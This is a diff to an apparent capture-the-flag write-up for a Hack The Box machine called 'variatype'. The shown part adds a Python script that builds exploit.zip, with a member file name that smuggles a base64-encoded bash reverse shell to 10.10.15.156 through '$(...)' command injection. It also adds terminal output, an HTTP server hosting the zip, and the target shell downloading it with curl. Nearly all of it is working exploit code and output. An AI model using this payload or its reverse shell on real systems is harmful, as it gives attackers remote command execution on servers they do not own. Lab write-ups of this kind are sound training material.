@@ -412,31 +412,49 @@ drwxrwsr-x 2 www-data www-data 4096 Mar 15 05:21 .
 $(bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1').ttf
 ```
 
+now create a exploit.zip file
 
 ```
-#!/usr/bin/env python3
+ajdev@rootbox:~/HTB$
+python3 << 'EOF'
 import base64
 import zipfile
 from pathlib import Path
 
-# Configuration
-attacker_ip = "10.10.13.68"
+attacker_ip = "10.10.15.156"
 attacker_port = 60001
-font_path = "/usr/share/fonts/TTF/Hack-Regular.ttf"
+font_path = "/home/ajdev/HTB/dummy.ttf"
 
-# Construct injection
 command = f"bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1'"
 payload = base64.b64encode(command.encode()).decode()
-
 font_data = Path(font_path).read_bytes()
-
 member_name = f"$(echo {payload}|base64 -d|bash).ttf"
 
-# Compress
 with zipfile.ZipFile("exploit.zip", "w", zipfile.ZIP_DEFLATED) as zf:
     zf.writestr(member_name, font_data)
-
 print("[+] exploit.zip created")
+print(f"[+] Payload: {member_name}")
+EOF
+[+] exploit.zip created
+[+] Payload: $(echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xNTYvNjAwMDEgMD4mMSc=|base64 -d|bash).ttf
+ajdev@rootbox:~/HTB$ sudo python3 -m http.server 80
+[sudo] password for ajdev:
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.8.177 - - [15/Mar/2026 15:39:46] "GET /exploit.zip HTTP/1.1" 200 -
+```
+
+then:
+
+```
+www-data@variatype:~/portal.variatype.htb/public/files$ curl -O http://10.10.15.156/exploit.zip
+<blic/files$ curl -O http://10.10.15.156/exploit.zip
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   616  100   616    0     0   1754      0 --:--:-- --:--:-- --:--:--  1754
+www-data@variatype:~/portal.variatype.htb/public/files$ ls -la exploit.zip
+ls -la exploit.zip
+-rw-r--r-- 1 www-data www-data 616 Mar 15 05:54 exploit.zip
+www-data@variatype:~/portal.variatype.htb/public/files$
 ```
 
 
